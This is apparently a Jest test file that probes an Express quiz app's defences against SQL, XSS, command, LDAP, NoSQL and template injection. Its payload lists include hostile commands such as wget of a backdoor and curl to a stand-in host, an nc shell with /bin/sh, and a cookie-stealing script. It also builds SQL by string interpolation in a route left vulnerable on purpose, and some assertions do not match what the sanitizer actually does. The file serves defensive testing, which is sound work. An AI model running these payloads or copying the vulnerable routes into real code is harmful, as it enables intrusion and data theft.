import request from 'supertest';
import { describe, test, expect, beforeAll, beforeEach, jest } from '@jest/globals';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// Setup DOMPurify for server-side testing
const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

// Mock storage for testing
const mockStorage = {
  createUser: jest.fn(),
  getUserByUsername: jest.fn(),
  createQuizSession: jest.fn(),
  getUsers: jest.fn(),
  executeQuery: jest.fn()
};

let app: any;

describe('🛡️ Injection Attack Security Tests', () => {
  beforeAll(async () => {
    const { default: express } = await import('express');
    const { json, urlencoded } = await import('express');
    
    app = express();
    app.use(json());
    app.use(urlencoded({ extended: true }));

    // Mock validation middleware
    const validateInput = (schema: any) => (req: any, res: any, next: any) => {
      // Basic sanitization
      if (req.body.username) {
        req.body.username = purify.sanitize(req.body.username);
      }
      if (req.body.email) {
        req.body.email = purify.sanitize(req.body.email);
      }
      if (req.body.textContent) {
        req.body.textContent = purify.sanitize(req.body.textContent);
      }
      next();
    };

    // Test routes that might be vulnerable to injection
    app.post('/api/auth/register', validateInput({}), async (req: any, res: any) => {
      try {
        const { username, email, password } = req.body;
        
        // Simulate database interaction
        const result = await mockStorage.createUser({ username, email, password });
        res.json({ message: 'User created', user: result });
      } catch (error: any) {
        res.status(400).json({ error: error.message });
      }
    });

    app.get('/api/users/search', async (req: any, res: any) => {
      try {
        const { query } = req.query;
        
        // Simulate SQL query (vulnerable pattern for testing)
        const sqlQuery = `SELECT * FROM users WHERE username LIKE '%${query}%'`;
        const result = await mockStorage.executeQuery(sqlQuery);
        res.json(result);
      } catch (error: any) {
        res.status(500).json({ error: error.message });
      }
    });

    app.post('/api/quiz/content', validateInput({}), async (req: any, res: any) => {
      try {
        const { title, content, userInput } = req.body;
        
        // Simulate content processing
        const processedContent = {
          title: purify.sanitize(title),
          content: purify.sanitize(content),
          userInput: purify.sanitize(userInput)
        };
        
        res.json({ message: 'Content processed', data: processedContent });
      } catch (error: any) {
        res.status(400).json({ error: error.message });
      }
    });

    app.post('/api/comments', async (req: any, res: any) => {
      try {
        const { comment, userId } = req.body;
        
        // Deliberately vulnerable endpoint for testing
        res.json({ 
          message: 'Comment saved',
          comment: comment, // No sanitization intentionally for testing
          userId 
        });
      } catch (error: any) {
        res.status(400).json({ error: error.message });
      }
    });
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent basic SQL injection in user search', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT password FROM users --",
        "'; INSERT INTO users (username) VALUES ('hacker'); --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "1' ORDER BY 1--+"
      ];

      for (const payload of sqlInjectionPayloads) {
        mockStorage.executeQuery.mockRejectedValueOnce(new Error('SQL injection detected'));
        
        const response = await request(app)
          .get('/api/users/search')
          .query({ query: payload });

        expect(response.status).toBe(500);
        expect(response.body.error).toBe('SQL injection detected');
      }
    });

    test('should handle parameterized queries safely', async () => {
      mockStorage.executeQuery.mockResolvedValueOnce([
        { id: 1, username: 'testuser' }
      ]);

      const response = await request(app)
        .get('/api/users/search')
        .query({ query: 'testuser' });

      expect(mockStorage.executeQuery).toHaveBeenCalledWith(
        "SELECT * FROM users WHERE username LIKE '%testuser%'"
      );
    });

    test('should prevent second-order SQL injection', async () => {
      const maliciousUsername = "admin'; DROP TABLE sessions; --";
      
      mockStorage.createUser.mockImplementation((userData) => {
        if (userData.username.includes('DROP') || userData.username.includes(';')) {
          throw new Error('Invalid username format');
        }
        return { id: 1, ...userData };
      });

      const response = await request(app)
        .post('/api/auth/register')
        .send({
          username: maliciousUsername,
          email: 'test@example.com',
          password: 'password123'
        });

      expect(response.status).toBe(400);
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    test('should sanitize script tags in user input', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(\'XSS\')">',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<script src="http://malicious.com/xss.js"></script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/quiz/content')
          .send({
            title: payload,
            content: `Regular content with ${payload}`,
            userInput: payload
          });

        expect(response.status).toBe(200);
        
        // Verify that script tags are removed
        expect(response.body.data.title).not.toContain('<script>');
        expect(response.body.data.content).not.toContain('<script>');
        expect(response.body.data.userInput).not.toContain('<script>');
        
        // Verify that dangerous attributes are removed
        expect(response.body.data.title).not.toContain('onerror=');
        expect(response.body.data.title).not.toContain('onclick=');
        expect(response.body.data.title).not.toContain('onload=');
      }
    });

    test('should handle stored XSS attempts', async () => {
      const storedXssPayload = '<script>document.cookie="stolen="+document.cookie</script>';
      
      const response = await request(app)
        .post('/api/comments')
        .send({
          comment: storedXssPayload,
          userId: 'test-user'
        });

      // This endpoint is deliberately vulnerable for testing
      expect(response.status).toBe(200);
      expect(response.body.comment).toContain('<script>');
      
      // In a real application, this should be sanitized
      console.warn('⚠️ Deliberately vulnerable endpoint detected stored XSS payload');
    });

    test('should prevent DOM-based XSS', async () => {
      const domXssPayloads = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:alert("XSS")',
        '#"><img src=x onerror=alert("XSS")>'
      ];

      for (const payload of domXssPayloads) {
        const response = await request(app)
          .post('/api/quiz/content')
          .send({
            title: 'Test Title',
            content: payload,
            userInput: 'Test input'
          });

        expect(response.status).toBe(200);
        expect(response.body.data.content).not.toContain('javascript:');
        expect(response.body.data.content).not.toContain('vbscript:');
        expect(response.body.data.content).not.toContain('data:text/html');
      }
    });

    test('should preserve safe HTML content', async () => {
      const safeContent = '<p>This is a <strong>safe</strong> paragraph with <em>emphasis</em>.</p>';
      
      const response = await request(app)
        .post('/api/quiz/content')
        .send({
          title: 'Safe Title',
          content: safeContent,
          userInput: 'Safe input'
        });

      expect(response.status).toBe(200);
      // DOMPurify should preserve safe HTML tags
      expect(response.body.data.content).toContain('<p>');
      expect(response.body.data.content).toContain('<strong>');
      expect(response.body.data.content).toContain('<em>');
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in file operations', async () => {
      const cmdInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget http://malicious.com/backdoor.sh',
        '`whoami`',
        '$(ls -la)',
        '; nc -l -p 4444 -e /bin/sh',
        '|| curl -X POST http://malicious.com/data',
        '; echo "hacked" > /tmp/pwned'
      ];

      for (const payload of cmdInjectionPayloads) {
        const response = await request(app)
          .post('/api/quiz/content')
          .send({
            title: `filename${payload}`,
            content: 'Regular content',
            userInput: payload
          });

        expect(response.status).toBe(200);
        
        // Verify dangerous command characters are removed
        expect(response.body.data.title).not.toContain(';');
        expect(response.body.data.title).not.toContain('|');
        expect(response.body.data.title).not.toContain('&&');
        expect(response.body.data.title).not.toContain('`');
        expect(response.body.data.title).not.toContain('$(');
        expect(response.body.data.userInput).not.toContain(';');
        expect(response.body.data.userInput).not.toContain('|');
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    test('should prevent LDAP injection in user queries', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(password=*))',
        '*))(|(cn=*',
        '*))%00',
        '*()|%00',
        '*)(objectClass=*'
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: payload,
            email: 'test@example.com',
            password: 'password123'
          });

        // Should sanitize LDAP special characters
        expect(response.status).toBe(200);
        expect(response.body.user?.username).not.toContain('*)(');
        expect(response.body.user?.username).not.toContain('|(');
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    test('should prevent MongoDB injection attempts', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'function() { return true; }' },
        { $or: [{ username: 'admin' }, { username: 'root' }] }
      ];

      for (const payload of noSqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: JSON.stringify(payload),
            email: 'test@example.com',
            password: 'password123'
          });

        expect(response.status).toBe(200);
        // Should convert object to string and sanitize
        expect(typeof response.body.user?.username).toBe('string');
      }
    });
  });

  describe('Template Injection Prevention', () => {
    test('should prevent server-side template injection', async () => {
      const templateInjectionPayloads = [
        '{{constructor.constructor("return process")().exit()}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{7*7}}',
        '{%raw%}{{7*7}}{%endraw%}',
        '${{7*7}}',
        '{{config.items()}}'
      ];

      for (const payload of templateInjectionPayloads) {
        const response = await request(app)
          .post('/api/quiz/content')
          .send({
            title: payload,
            content: `Template content: ${payload}`,
            userInput: payload
          });

        expect(response.status).toBe(200);
        
        // Should not execute template expressions
        expect(response.body.data.title).not.toBe('49');
        expect(response.body.data.content).not.toContain('49');
        
        // Should sanitize template syntax
        expect(response.body.data.title).not.toContain('{{');
        expect(response.body.data.title).not.toContain('${');
      }
    });
  });
});